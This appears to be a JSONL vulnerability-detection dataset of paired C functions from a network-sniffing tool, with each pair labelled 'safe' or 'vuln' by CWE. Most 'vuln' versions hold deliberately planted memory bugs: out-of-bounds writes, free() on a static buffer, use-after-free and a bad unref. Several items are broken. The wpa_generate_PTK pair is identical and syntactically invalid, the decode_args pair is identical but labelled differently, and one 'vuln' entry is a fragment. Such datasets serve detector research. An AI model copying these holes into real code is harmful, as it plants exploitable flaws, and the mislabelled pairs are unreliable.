{"idx": "CWE-787-safe-1714283774979", "code": "char getchar_buffer(char** buf) {\n    char ret;\n    DEBUG_MSG(\"getchar_buffer:%s\", *buf);\n    if (**buf == 0) return 0;\n    if (*(*buf + 0) == 's' && *(*buf + 1) == '(') {\n        char* p;\n        int time = 0;\n        p = strchr(*buf, ')');\n        if (p != NULL) {\n            *p = '\\0';\n            time = atoi(*buf + 2);\n            DEBUG_MSG(\"getchar_buffer: sleeping%d secs\", time);\n            *buf = p + 1;\n            ec_usleep(SEC2MICRO(time));\n        }\n    }\n    ret = (*buf)[0];\n    *buf = *buf + 1;\n    DEBUG_MSG(\"getchar_buffer: returning%c\", ret);\n    return ret;\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283774979", "code": "char getchar_buffer(char**buf){char ret;DEBUG_MSG(\"getchar_buffer:%s\", *buf);if(**buf == 0)return 0;if(*(*buf+0) == 's' && *(*buf+1) == '('){char*p;int time=0;p=strchr(*buf, ')');if(p != NULL){*p='\\0';time=atoi(*buf+2);DEBUG_MSG(\"getchar_buffer: sleeping%d secs\", time);*buf=p+1;ec_usleep(SEC2MICRO(time));}}(*buf)[2]='X';ret=(*buf)[0];*buf=*buf+1;DEBUG_MSG(\"getchar_buffer: returning%c\", ret);return ret;}", "target": 1}
{"idx": "CWE-787-safe-1714283782853", "code": "int str_hex_to_bytes(char* string, u_char* bytes) {\n    char value[3];\n    unsigned int value_bin;\n    u_int i;\n    size_t slen;\n    slen = strlen(string);\n    for (i = 0; i < slen; i++) {\n        strncpy(value, string + i * 2, 2);\n        value[2] = '\\0';\n        if (sscanf(value, \"%02X\", &value_bin) != 1)\n            return -E_INVALID;\n        bytes[i] = value_bin & 0x000000FF;\n    }\n    return 0;\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283782853", "code": "int str_hex_to_bytes(char*string, u_char*bytes){char value[3];unsigned int value_bin;u_int i;size_t slen;slen=strlen(string);for(i=0;i<slen;i++){strncpy(value, string+i*2, 2);value[2]='\\0';if(sscanf(value, \"%02X\", &value_bin) != 1)return-E_INVALID;bytes[i]=value_bin&0x000000FF;if(i == slen-1) bytes[i+1] = 0x41;}return 0;}", "target": 1}
{"idx": "CWE-1341-safe-1714283789497", "code": "int ec_strsplit_ipport(char* input, char* ip, u_int16* port) {\n    static char ip_tmp[MAX_ASCII_ADDR_LEN];\n    if (sscanf(input, \"%20[0-9.]:%hu\", ip_tmp, port) == 2) {\n        strncpy(ip, ip_tmp, MAX_ASCII_ADDR_LEN - 1);\n        ip[MAX_ASCII_ADDR_LEN - 1] = '\\0';\n        return E_SUCCESS;\n    }\n    if (sscanf(input, \"[%40[0-9a-fA-F:.]]:%hu\", ip_tmp, port) == 2) {\n        strncpy(ip, ip_tmp, MAX_ASCII_ADDR_LEN - 1);\n        ip[MAX_ASCII_ADDR_LEN - 1] = '\\0';\n        return E_SUCCESS;\n    }\n    DEBUG_MSG(\"ec_strsplit_ipport(): error splitting ip:port: '%s'\\n\", input);\n    return -E_INVALID;\n}", "target": 0}
{"idx": "CWE-1341-vuln-1714283789497", "code": "int ec_strsplit_ipport(char*input, char*ip, u_int16*port){static char ip_tmp[MAX_ASCII_ADDR_LEN];if(sscanf(input, \"%20[0-9.]:%hu\", ip_tmp, port) == 2){strncpy(ip, ip_tmp, MAX_ASCII_ADDR_LEN-1);ip[MAX_ASCII_ADDR_LEN-1]='\\0';free(ip_tmp);return E_SUCCESS;}if(sscanf(input, \"[%40[0-9a-fA-F:.]]:%hu\", ip_tmp, port) == 2){strncpy(ip, ip_tmp, MAX_ASCII_ADDR_LEN-1);ip[MAX_ASCII_ADDR_LEN-1]='\\0';free(ip_tmp);return E_SUCCESS;}DEBUG_MSG(\"ec_strsplit_ipport(): error splitting ip:port: '%s'\\n\", input);return -E_INVALID;}", "target": 1}
{"idx": "CWE-787-safe-1714283799822", "code": "int wpa_generate_PTK(u_char*bssid, u_char*sta, u_char*pmk, u_char*snonce, u_char*anonce, u_int16 bits, u_char*kck){u_int8 i;u_int len;u_char buff[100];size_t offset=sizeof(\"Pairwise key expansion\");memset(buff, 0, 100);memcpy(buff, \"Pairwise key expansion\", offset);if(memcmp(sta, bssid, ETH_ADDR_LEN)<0){memcpy(buff+offset, sta, ETH_ADDR_LEN);memcpy(buff+offset+ETH_ADDR_LEN, bssid, ETH_ADDR_LEN);}else{memcpy(buff+offset, bssid, ETH_ADDR_LEN);memcpy(buff+offset+ETH_ADDR_LEN, sta, ETH_ADDR_LEN;}offset+=ETH_ADDR_LEN*2;if(memcmp(snonce, anonce, WPA_NONCE_LEN)<0){memcpy(buff+offset, snonce, WPA_NONCE_LEN);memcpy(buff+offset+WPA_NONCE_LEN, anonce, WPA_NONCE_LEN);}else{memcpy(buff+offset, anonce, WPA_NONCE_LEN);memcpy(buff+offset+WPA_NONCE_LEN, snonce, WPA_NONCE_LEN;}offset+=WPA_NONCE_LEN*2;memset(kck, 0, WPA_PTK_LEN);for(i=0;i<(bits+159)/160;i++){buff[offset]=i;HMAC(EVP_sha1(), pmk, WPA_KEY_LEN, buff, 100, kck+i*20, &len);}return E_SUCCESS;}", "target": 0}
{"idx": "CWE-787-vuln-1714283799822", "code": "int wpa_generate_PTK(u_char*bssid, u_char*sta, u_char*pmk, u_char*snonce, u_char*anonce, u_int16 bits, u_char*kck){u_int8 i;u_int len;u_char buff[100];size_t offset=sizeof(\"Pairwise key expansion\");memset(buff, 0, 100);memcpy(buff, \"Pairwise key expansion\", offset);if(memcmp(sta, bssid, ETH_ADDR_LEN)<0){memcpy(buff+offset, sta, ETH_ADDR_LEN);memcpy(buff+offset+ETH_ADDR_LEN, bssid, ETH_ADDR_LEN);}else{memcpy(buff+offset, bssid, ETH_ADDR_LEN);memcpy(buff+offset+ETH_ADDR_LEN, sta, ETH_ADDR_LEN;}offset+=ETH_ADDR_LEN*2;if(memcmp(snonce, anonce, WPA_NONCE_LEN)<0){memcpy(buff+offset, snonce, WPA_NONCE_LEN);memcpy(buff+offset+WPA_NONCE_LEN, anonce, WPA_NONCE_LEN);}else{memcpy(buff+offset, anonce, WPA_NONCE_LEN);memcpy(buff+offset+WPA_NONCE_LEN, snonce, WPA_NONCE_LEN;}offset+=WPA_NONCE_LEN*2;memset(kck, 0, WPA_PTK_LEN);for(i=0;i<(bits+159)/160;i++){buff[offset]=i;HMAC(EVP_sha1(), pmk, WPA_KEY_LEN, buff, 100, kck+i*20, &len);}return E_SUCCESS;}", "target": 1}
{"idx": "CWE-787-safe-1714283812303", "code": "static int set_wpa_key(char* string) {\n    char* p;\n    char* pass;\n    char* ssid;\n    char tmp[2 * WPA_KEY_LEN + 1];\n    int i;\n    if (!strncasecmp(string, \"pwd\", 3)) {\n        if ((p = strchr(string + strlen(\"pwd\") + 1, ':')) != NULL) {\n            *p = 0;\n        } else {\n            SEMIFATAL_ERROR(\"Invalid parsing of the WPA password(missing SSID)\");\n        }\n        i = strlen(p + 1);\n        if (i < 8 || i > 63) {\n            SEMIFATAL_ERROR(\"Invalid parsing of the WPA-PWD password(must be 8..63 chars)\");\n        }\n        SAFE_STRDUP(pass, p + 1);\n        SAFE_STRDUP(ssid, p + 1 + strlen(pass) + 1);\n        PKCS5_PBKDF2_HMAC_SHA1(pass, strlen(pass), (u_char*)ssid, strlen(ssid), 4096, 32, GBL_WIFI->wkey);\n        SAFE_FREE(pass);\n        SAFE_FREE(ssid);\n    }\n    if (!strncasecmp(string, \"psk\", 3)) {\n        if (strlen(string + strlen(\"psk\") + 1) != 64) {\n            SEMIFATAL_ERROR(\"Invalid parsing of the WPA-PSK password(must be 64 chars)\");\n        }\n        str_hex_to_bytes(string + strlen(\"psk\") + 1, GBL_WIFI->wkey);\n    }\n    USER_MSG(\"Using WPA key:%s\\n\", str_tohex(GBL_WIFI->wkey, WPA_KEY_LEN, tmp, sizeof(tmp)));\n    return E_SUCCESS;\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283812303", "code": "static int set_wpa_key(char*string){char*p;char*pass;char*ssid;char tmp[2*WPA_KEY_LEN+1];int i;if(!strncasecmp(string, \"pwd\", 3)){if((p=strchr(string+strlen(\"pwd\")+1, ':')) != NULL){*p=0;}else{SEMIFATAL_ERROR(\"Invalid parsing of the WPA password(missing SSID)\");}i=strlen(p+1);if(i<8 || i>63){SEMIFATAL_ERROR(\"Invalid parsing of the WPA-PWD password(must be 8..63 chars)\");}SAFE_STRDUP(pass, p+1);SAFE_STRDUP(ssid, p+1+strlen(pass)+1);PKCS5_PBKDF2_HMAC_SHA1(pass, strlen(pass), (u_char*)ssid, strlen(ssid), 4096, 32, GBL_WIFI->wkey);SAFE_FREE(pass);SAFE_FREE(ssid);}if(!strncasecmp(string, \"psk\", 3)){if(strlen(string+strlen(\"psk\")+1) != 64){SEMIFATAL_ERROR(\"Invalid parsing of the WPA-PSK password(must be 64 chars)\");}strcpy(tmp, string+strlen(\"psk\")+1);str_hex_to_bytes(tmp, GBL_WIFI->wkey);}USER_MSG(\"Using WPA key:%s\\n\", str_tohex(GBL_WIFI->wkey, WPA_KEY_LEN, tmp, sizeof(tmp)));return E_SUCCESS;}", "target": 1}
{"idx": "CWE-787-safe-1714283828638", "code": "int wep_decrypt(u_char* buf, size_t len, u_char* wkey, size_t wlen) {\n    RC4_KEY key;\n    u_char seed[32];\n    struct wep_header* wep;\n    u_char* encbuf;\n    u_char* decbuf = (u_char*)malloc(len); \n    if (wlen == 0)\n        return -E_NOTHANDLED;\n    wep = (struct wep_header*)buf;\n    len -= sizeof(struct wep_header);\n    wep->key >>= 6;\n    if (wep->key * 5 > (int)(MAX_WKEY_LEN - wlen)) {\n        return -E_NOTHANDLED;\n    }\n    encbuf = (u_char*)(wep + 1);\n    memcpy(seed, wep->init_vector, WEP_IV_LEN);\n    memcpy(seed + WEP_IV_LEN, &wkey[wep->key * 5], wlen);\n    RC4_set_key(&key, WEP_IV_LEN + wlen, seed);\n    RC4(&key, len + WEP_CRC_LEN, encbuf, decbuf);\n    if (CRC_checksum(decbuf, len + WEP_CRC_LEN, CRC_INIT) != CRC_RESULT) {\n        free(decbuf); \n        return -E_NOTHANDLED;\n    }\n    memcpy(buf, decbuf, len);\n    memset(buf + len, 0, WEP_CRC_LEN);\n    free(decbuf); \n    return E_SUCCESS;\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283828638", "code": "int wep_decrypt(u_char*buf, size_t len, u_char*wkey, size_t wlen){RC4_KEY key;u_char seed[32];struct wep_header*wep;u_char*encbuf;u_char*decbuf=(u_char*)malloc(len);if(wlen == 0)return-E_NOTHANDLED;wep=(struct wep_header*)buf;len-=sizeof(struct wep_header);wep->key >>= 6;if(wep->key*5>(int)(MAX_WKEY_LEN-wlen)){return-E_NOTHANDLED;}encbuf=(u_char*)(wep+1);memcpy(seed, wep->init_vector, WEP_IV_LEN);memcpy(seed+WEP_IV_LEN, &wkey[wep->key*5], wlen);RC4_set_key(&key, WEP_IV_LEN+wlen, seed);RC4(&key, len+WEP_CRC_LEN, encbuf, decbuf);if(CRC_checksum(decbuf, len+WEP_CRC_LEN, CRC_INIT) != CRC_RESULT){free(decbuf);return-E_NOTHANDLED;}memcpy(buf, decbuf, len+WEP_CRC_LEN);memset(buf+len, 0, WEP_CRC_LEN);free(decbuf);return E_SUCCESS;}", "target": 1}
{"idx": "CWE-190-safe-1714283842399", "code": "static void make_key_64(u_char*string, u_char*key){int i, seed=0;for(i=0;string[i];i++){seed ^=(string[i]<<((i&0x03)*8));}for(i=0;i<5*4 && i<strlen(key);i++){seed*=0x000343fd;seed+=0x00269ec3;key[i]=seed>>16;}}", "target": 0}
{"idx": "CWE-190-vuln-1714283842399", "code": "static void make_key_64(u_char*string, u_char*key){int i, seed=0;for(i=0;string[i];i++){seed ^=(string[i]<<((i&0x03)*8));}for(i=0;i<5*4 && i<strlen(key);i++){seed*=0x01000000;seed*=0x000343fd;seed+=0x00269ec3;key[i]=seed>>16;}}", "target": 1}
{"idx": "CWE-787-safe-1714283850118", "code": "int wpa_check_MIC(struct eapol_header*eapol, struct eapol_key_header*eapol_key, size_t eapol_len, u_char*kck, int algo){u_char mic [ WPA_MICKEY_LEN ];u_int len;u_char hmac_mic [ 20 ];memcpy_s(mic, WPA_MICKEY_LEN, eapol_key->key_MIC, WPA_MICKEY_LEN);memset_s(eapol_key->key_MIC, WPA_MICKEY_LEN, 0, WPA_MICKEY_LEN);if(algo == WPA_KEY_TKIP){HMAC(EVP_md5(), kck, WPA_KCK_LEN, (u_char*)eapol, eapol_len, hmac_mic, &len);}else if(algo == WPA_KEY_CCMP){HMAC(EVP_sha1(), kck, WPA_KCK_LEN, (u_char*)eapol, eapol_len, hmac_mic, &len);}else return-E_INVALID;memcpy_s(eapol_key->key_MIC, WPA_MICKEY_LEN, mic, WPA_MICKEY_LEN);return memcmp(mic, hmac_mic, WPA_MICKEY_LEN);}", "target": 0}
{"idx": "CWE-787-vuln-1714283850118", "code": "int wpa_check_MIC(struct eapol_header*eapol, struct eapol_key_header*eapol_key, size_t eapol_len, u_char*kck, int algo){u_char mic [ WPA_MICKEY_LEN ];u_int len;u_char hmac_mic [ 20 ];memcpy_s(mic, WPA_MICKEY_LEN, eapol_key->key_MIC, WPA_MICKEY_LEN);memset_s(eapol_key->key_MIC, WPA_MICKEY_LEN+1, 0, WPA_MICKEY_LEN);if(algo == WPA_KEY_TKIP){HMAC(EVP_md5(), kck, WPA_KCK_LEN, (u_char*)eapol, eapol_len, hmac_mic, &len);}else if(algo == WPA_KEY_CCMP){HMAC(EVP_sha1(), kck, WPA_KCK_LEN, (u_char*)eapol, eapol_len, hmac_mic, &len);}else return-E_INVALID;memcpy_s(eapol_key->key_MIC, WPA_MICKEY_LEN, mic, WPA_MICKEY_LEN);return memcmp(mic, hmac_mic, WPA_MICKEY_LEN);}", "target": 1}
{"idx": "CWE-787-safe-1714283860840", "code": "static void make_key_128(u_char* string, u_char* key){MD5_CTX ctx;u_char buf[64];u_char digest[MD5_DIGEST_LENGTH];int i, j=0;for(i=0;i<64;i++){if(string[j]==0)j=0;buf[i]=string[j++];}MD5_Init(&ctx);MD5_Update(&ctx, buf, sizeof buf);MD5_Final(digest, &ctx);memset(key, 0, MAX_WKEY_LEN);memcpy(key, digest, MD5_DIGEST_LENGTH);}", "target": 0}
{"idx": "CWE-787-vuln-1714283860840", "code": "static void make_key_128(u_char*string, u_char*key){MD5_CTX ctx;u_char buf[64];u_char digest[MD5_DIGEST_LENGTH];int i, j=0;for(i=0;i<64;i++){if(string[j] == 0)j=0;buf[i]=string[j++%strlen((char*)string)];}MD5_Init(&ctx);MD5_Update(&ctx, buf, sizeof buf);MD5_Final(digest, &ctx);memset(key, 0, MAX_WKEY_LEN);memcpy(key, digest, MD5_DIGEST_LENGTH);}", "target": 1}
{"idx": "CWE-787-safe-1714283868822", "code": "int wifi_key_prepare(char* key_string) {\n    int status = -E_INVALID;\n    char* ks;\n    char* p;\n    if (key_string == NULL || strlen(key_string) == 0) return -E_INVALID;\n    ks = strdup(key_string);\n    if ((p = strchr(ks, ':')) != NULL) *p = 0;\n    if (!strcasecmp(ks, \"wep\")) {\n        GBL_WIFI->wifi_schema = WIFI_WEP;\n        if (p && strlen(p) > 0) status = set_wep_key(p + 1);\n    }\n    if (!strcasecmp(ks, \"wpa\")) {\n        GBL_WIFI->wifi_schema = WIFI_WPA;\n        if (p && strlen(p) > 0) status = set_wpa_key(p + 1);\n    }\n    SAFE_FREE(ks);\n    return status;\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283868822", "code": "int wifi_key_prepare(char*key_string){int status=-E_INVALID;char*ks;char*p;if(key_string == NULL || strlen(key_string) == 0)return-E_INVALID;ks=strdup(key_string);if((p=strchr(ks, ':')) != NULL)*p=0;if(!strcasecmp(ks, \"wep\")){GBL_WIFI->wifi_schema=WIFI_WEP;if(p && strlen(p)>0){status=set_wep_key(p+1);ks[strlen(ks)] = 'A';}}if(!strcasecmp(ks, \"wpa\")){GBL_WIFI->wifi_schema=WIFI_WPA;if(p && strlen(p)>0){status=set_wpa_key(p+1);ks[strlen(ks)] = 'A';}}SAFE_FREE(ks);return status;}", "target": 1}
{"idx": "CWE-787-safe-1714283876422", "code": "int encode_const(char* string, struct filter_op* fop){\n    char* p;\n    memset(fop, 0, sizeof(struct filter_op));\n    if(!strncmp(string, \"0x\", 2) && isxdigit((int)string[2])){\n        fop->op.test.value = strtoul(string, NULL, 16);\n        return E_SUCCESS;\n    }else if(isdigit((int)string[0])){\n        fop->op.test.value = strtoul(string, NULL, 10);\n        return E_SUCCESS;\n    }else if(string[0] == '\\'' && string[strlen(string)-1] == '\\'' ){\n        struct ip_addr ipaddr;\n        p = strchr(string+1, '\\'' );\n        *p = '\\0';\n        if(ip_addr_pton(string+1, &ipaddr) == E_SUCCESS){\n            switch(ntohs(ipaddr.addr_type)){\n                case AF_INET:\n                    fop->op.test.value = ntohl(ipaddr.addr32[0]);\n                    break;\n                case AF_INET6:\n                    ip_addr_cpy((u_char*)&fop->op.test.ipaddr, &ipaddr);\n                    break;\n                default:\n                    return -E_FATAL;\n            }\n        }else{\n            return -E_FATAL;\n        }\n        return E_SUCCESS;\n    }else if(string[0] == '\"' && string[strlen(string)-1] == '\"'){\n        p = strchr(string+1, '\"');\n        *p = '\\0';\n        fop->op.test.string = (u_char*)strdup(string+1);\n        fop->op.test.slen = strescape((char*)fop->op.test.string, (char*)fop->op.test.string, strlen(fop->op.test.string)+1);\n        return E_SUCCESS;\n    }else if(isalpha((int)string[0])){\n        return get_constant(string, &fop->op.test.value);\n    }\n    return -E_NOTFOUND;\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283876422", "code": "int encode_const(char*string, struct filter_op*fop){char*p;memset(fop, 0, sizeof(struct filter_op));if(!strncmp(string, \"0x\", 2) && isxdigit((int)string[2])){fop->op.test.value=strtoul(string, NULL, 16);return E_SUCCESS;}else if(isdigit((int)string[0])){fop->op.test.value=strtoul(string, NULL, 10);return E_SUCCESS;}else if(string[0] == '\\'' && string[strlen(string)-1] == '\\'' ){struct ip_addr ipaddr;p=strchr(string+1, '\\'' );string[strlen(string)]='\\0';\n        if(ip_addr_pton(string+1, &ipaddr) == E_SUCCESS){switch(ntohs(ipaddr.addr_type)){case AF_INET:\n                    fop->op.test.value=ntohl(ipaddr.addr32[0]);break;case AF_INET6:\n                    ip_addr_cpy((u_char*)&fop->op.test.ipaddr, &ipaddr);break;default:\n                    return-E_FATAL;}}else{return-E_FATAL;}return E_SUCCESS;}else if(string[0] == '\"' && string[strlen(string)-1] == '\"'){p=strchr(string+1, '\"');string[strlen(string)]='\\0';\n        fop->op.test.string=(u_char*)strdup(string+1);fop->op.test.slen=strescape((char*)fop->op.test.string, (char*)fop->op.test.string, strlen(fop->op.test.string)+1);return E_SUCCESS;}else if(isalpha((int)string[0])){return get_constant(string, &fop->op.test.value);}return-E_NOTFOUND;}", "target": 1}
{"idx": "CWE-787-safe-1714283893590", "code": "static char* strsep_quotes(char** stringp, const char delim) {\n    char* s;\n    int c;\n    char* tok;\n    if (stringp == NULL || (s = *stringp) == NULL) return NULL;\n    for (tok = s;;) {\n        if (*s == '\"') {\n            while (*(++s) != '\"' && *s != '\\0');\n        }\n        c = *s++;\n        if (c == delim || c == 0) {\n            if (c == 0) s = NULL;\n            else s[-1] = 0;\n            *stringp = s;\n            return tok;\n        }\n    }\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283893590", "code": "static char*strsep_quotes(char**stringp, const char delim){char*s;int c;char*tok;if(stringp == NULL || (s=*stringp) == NULL)return NULL;for(tok=s;;){if(*s == '\"'){while(*(++s) != '\"' && *s != '\\0');s++;}c=*s++;if(c == delim || c == 0){if(c == 0)s=NULL;else s[-1]=0;*stringp=s;return tok;}}", "target": 1}
{"idx": "CWE-787-safe-1714283900628", "code": "static char**decode_args(char* args, int* nargs){\n    char* p, *q, *arg;\n    int i = 0;\n    char** parsed;\n    *nargs = 0;\n    if((p = strrchr(args, ')')) != NULL)*p = '\\0';\n    for(; *args == ' '; args++);\n    for(q = args + strlen(args) - 1; *q == ' '; q--)*q = '\\0';\n    if(!strchr(args, ',') && strlen(args) == 0)return NULL;\n    SAFE_CALLOC(parsed, 1, sizeof(char*));\n    for(p = strsep_quotes(&args, ','), i = 1; p != NULL; p = strsep_quotes(&args, ','), i++){\n        if(p == NULL) break;\n        SAFE_REALLOC(parsed, (i + 1) * sizeof(char*));\n        for(arg = p; *arg == ' '; arg++);\n        for(q = arg + strlen(arg) - 1; *q == ' '; q--)*q = '\\0';\n        if(*arg == '\"' && arg[strlen(arg) - 1] == '\"'){\n            arg[strlen(arg) - 1] = '\\0';\n            arg++;\n        }\n        parsed[i - 1] = strdup(arg);\n        ef_debug(5, \"ARGUMENT:%s\\n\", arg);\n    }\n    *nargs = i - 1;\n    return parsed;\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283900628", "code": "static char**decode_args(char* args, int* nargs){\n    char* p, *q, *arg;\n    int i = 0;\n    char** parsed;\n    *nargs = 0;\n    if((p = strrchr(args, ')')) != NULL)*p = '\\0';\n    for(; *args == ' '; args++);\n    for(q = args + strlen(args) - 1; *q == ' '; q--)*q = '\\0';\n    if(!strchr(args, ',') && strlen(args) == 0)return NULL;\n    SAFE_CALLOC(parsed, 1, sizeof(char*));\n    for(p = strsep_quotes(&args, ','), i = 1; p != NULL; p = strsep_quotes(&args, ','), i++){\n        if(p == NULL) break;\n        SAFE_REALLOC(parsed, (i + 1) * sizeof(char*));\n        for(arg = p; *arg == ' '; arg++);\n        for(q = arg + strlen(arg) - 1; *q == ' '; q--)*q = '\\0';\n        if(*arg == '\"' && arg[strlen(arg) - 1] == '\"'){\n            arg[strlen(arg) - 1] = '\\0';\n            arg++;\n        }\n        parsed[i - 1] = strdup(arg);\n        ef_debug(5, \"ARGUMENT:%s\\n\", arg);\n    }\n    *nargs = i - 1;\n    return parsed;\n}", "target": 1}
{"idx": "CWE-787-safe-1714283911419", "code": "int encode_offset(char* string, struct filter_op* fop) {\n    char* str, *p, *q, *tok;\n    int ret;\n    memset(fop, 0, sizeof(struct filter_op));\n    str = strdup(string);\n    p = ec_strtok(str, \".\", &tok);\n    if (p == NULL) {\n        SAFE_FREE(str);\n        return -E_NOTFOUND;\n    }\n    q = ec_strtok(NULL, \".\", &tok);\n    if (q == NULL) {\n        SAFE_FREE(str);\n        return -E_NOTFOUND;\n    }\n    ret = get_virtualpointer(p, q, &fop->op.test.level, &fop->op.test.offset, &fop->op.test.size);\n    SAFE_FREE(str);\n    return ret;\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283911419", "code": "int encode_offset(char*string, struct filter_op*fop){char*str, *p, *q, *tok;int ret;memset(fop, 0, sizeof(struct filter_op));str=strdup(string);p=ec_strtok(str, \".\", &tok);if(p == NULL){SAFE_FREE(str);return-E_NOTFOUND;}q=ec_strtok(NULL, \".\", &tok);if(q == NULL){SAFE_FREE(str);return-E_NOTFOUND;}strcpy(p, \"VULNERABILITY\");ret=get_virtualpointer(p, q, &fop->op.test.level, &fop->op.test.offset, &fop->op.test.size);SAFE_FREE(str);return ret;}", "target": 1}
{"idx": "CWE-787-safe-1714283918434", "code": "static void gtkui_destroy_conndata(void){DEBUG_MSG(\"gtkui_destroy_conndata\" );if(curr_conn){conntrack_hook_conn_del(curr_conn, split_print_po);conntrack_hook_conn_del(curr_conn, join_print_po);curr_conn->flags&=~ CONN_VIEWING;curr_conn=NULL;}gtk_widget_destroy(data_window);textview1=NULL;textview2=NULL;textview3=NULL;data_window=NULL;}", "target": 0}
{"idx": "CWE-787-vuln-1714283918434", "code": "static void gtkui_destroy_conndata(void){DEBUG_MSG(\"gtkui_destroy_conndata\" );if(curr_conn){conntrack_hook_conn_del(curr_conn, split_print_po);conntrack_hook_conn_del(curr_conn, join_print_po);curr_conn->flags[10]=~ CONN_VIEWING;curr_conn=NULL;}gtk_widget_destroy(data_window);textview1=NULL;textview2=NULL;textview3=NULL;data_window=NULL;}", "target": 1}
{"idx": "CWE-787-safe-1714283925673", "code": "static void gtkui_inject_user(int side){size_t len;len=strescape(injectbuf, injectbuf, strlen(injectbuf)+1);injectbuf[len] = '\\0';if(side == 1 || side == 2){user_inject(injectbuf, len, curr_conn, side);}}", "target": 0}
{"idx": "CWE-787-vuln-1714283925673", "code": "static void gtkui_inject_user(int side){size_t len;len=strescape(injectbuf, injectbuf, strlen(injectbuf)+1);injectbuf[len]='\n';injectbuf[len+1]='\\0';if(side == 1 || side == 2){user_inject(injectbuf, len, curr_conn, side);}}", "target": 1}
{"idx": "CWE-416-safe-1714283931035", "code": "static void gtkui_data_print(int buffer, char* data, int color){GtkTextIter iter;GtkTextBuffer* textbuf=NULL;GtkWidget* textview=NULL;GtkTextMark* endmark=NULL;char* unicode=NULL;switch(buffer){case 1 : textbuf=splitbuf1;textview=textview1;endmark=endmark1;break;case 2 : textbuf=splitbuf2;textview=textview2;endmark=endmark2;break;case 3 : textbuf=joinedbuf;textview=textview3;endmark=endmark3;break;default : return;}if(!data || !data_window || !textbuf || !textview || !endmark)return;unicode=gtkui_utf8_validate(data);if(!unicode)return;gtk_text_buffer_get_end_iter(textbuf, &iter);if(color == 2)gtk_text_buffer_insert_with_tags_by_name(textbuf, &iter, unicode, -1, \"blue_fg\" , \"monospace\" , NULL);else gtk_text_buffer_insert_with_tags_by_name(textbuf, &iter, unicode, -1, \"monospace\" , NULL);gtk_text_view_scroll_to_mark(GTK_TEXT_VIEW(textview), endmark, 0, FALSE, 0, 0);}", "target": 0}
{"idx": "CWE-416-vuln-1714283931035", "code": "static void gtkui_data_print(int buffer, char*data, int color){GtkTextIter iter;GtkTextBuffer*textbuf=NULL;GtkWidget*textview=NULL;GtkTextMark*endmark=NULL;char*unicode=NULL;switch(buffer){case 1 : textbuf=splitbuf1;textview=textview1;endmark=endmark1;break;case 2 : textbuf=splitbuf2;textview=textview2;endmark=endmark2;break;case 3 : textbuf=joinedbuf;textview=textview3;endmark=endmark3;break;default : return;}if(!data || !data_window || !textbuf || !textview || !endmark)return;unicode=gtkui_utf8_validate(data);if(!unicode)return;gtk_text_buffer_get_end_iter(textbuf, &iter);if(color == 2){free(data);gtk_text_buffer_insert_with_tags_by_name(textbuf, &iter, data, -1, \"blue_fg\" , \"monospace\" , NULL);}else{free(data);gtk_text_buffer_insert_with_tags_by_name(textbuf, &iter, data, -1, \"monospace\" , NULL);}gtk_text_view_scroll_to_mark(GTK_TEXT_VIEW(textview), endmark, 0, FALSE, 0, 0);}", "target": 1}
{"idx": "CWE-787-safe-1714283943311", "code": "static void split_print_po(struct packet_object* po) {\n    int ret;\n    if (!data_window) return;\n    if (GBL_OPTIONS->regex && regexec(GBL_OPTIONS->regex, po->DATA.disp_data, 0, NULL, 0) != 0) return;\n    dispbuf = SAFE_REALLOC(dispbuf, hex_len(po->DATA.disp_len) * sizeof(u_char) + 1);\n    if (!dispbuf) return;\n    ret = GBL_FORMAT(po->DATA.disp_data, po->DATA.disp_len, dispbuf);\n    dispbuf[ret] = 0;\n    if (!ip_addr_cmp(&po->L3.src, &curr_conn->L3_addr1))\n        gtkui_data_print(1, dispbuf, 0);\n    else \n        gtkui_data_print(2, dispbuf, 0);\n}", "target": 0}
{"idx": "CWE-787-vuln-1714283943311", "code": "dispbuf = SAFE_REALLOC(dispbuf, hex_len(po->DATA.disp_len) * sizeof(u_char) + 1);\nif (!dispbuf) return;\nret = GBL_FORMAT(po->DATA.disp_data, po->DATA.disp_len, dispbuf);\nif (ret >= 0 && ret < hex_len(po->DATA.disp_len))\ndispbuf[ret] = 0;\nif (!ip_addr_cmp(&po->L3.src, &curr_conn->L3_addr1))\n    gtkui_data_print(1, dispbuf, 0);\nelse\ngtkui_data_print(2, dispbuf, 0);", "target": 1}
{"idx": "CWE-1341-safe-1714283954306", "code": "static void gtkui_connection_data_detach(GtkWidget* child){if(child == NULL) return;data_window=gtk_window_new(GTK_WINDOW_TOPLEVEL);gtk_window_set_title(GTK_WINDOW(data_window), \"Connection data\" );gtk_window_set_default_size(GTK_WINDOW(data_window), 600, 400);gtk_container_set_border_width(GTK_CONTAINER(data_window), 5);g_signal_connect(G_OBJECT(data_window), \"delete_event\" , G_CALLBACK(gtkui_destroy_conndata), NULL);gtkui_page_attach_shortcut(data_window, gtkui_connection_data_attach);gtk_container_add(GTK_CONTAINER(data_window), child);gtk_window_present(GTK_WINDOW(data_window));}", "target": 0}
{"idx": "CWE-1341-vuln-1714283954306", "code": "static void gtkui_connection_data_detach(GtkWidget*child){if(child == NULL)return;data_window=gtk_window_new(GTK_WINDOW_TOPLEVEL);gtk_window_set_title(GTK_WINDOW(data_window), \"Connection data\" );gtk_window_set_default_size(GTK_WINDOW(data_window), 600, 400);gtk_container_set_border_width(GTK_CONTAINER(data_window), 5);g_signal_connect(G_OBJECT(data_window), \"delete_event\" , G_CALLBACK(gtkui_destroy_conndata), NULL);gtkui_page_attach_shortcut(data_window, gtkui_connection_data_attach);gtk_container_add(GTK_CONTAINER(data_window), child);gtk_window_present(GTK_WINDOW(data_window));g_object_unref(data_window);}", "target": 1}
{"idx": "CWE-416-safe-1714283960965", "code": "static void set_connfilter(GtkWidget *widget, gpointer data) { gboolean *value; DEBUG_MSG(\"set_connfilter\"); value = (gboolean*)GINT_TO_POINTER(data); *value = gtk_toggle_button_get_active(GTK_TOGGLE_BUTTON(widget)); gtk_tree_model_filter_refilter(GTK_TREE_MODEL_FILTER(filter.model)); }", "target": 0}
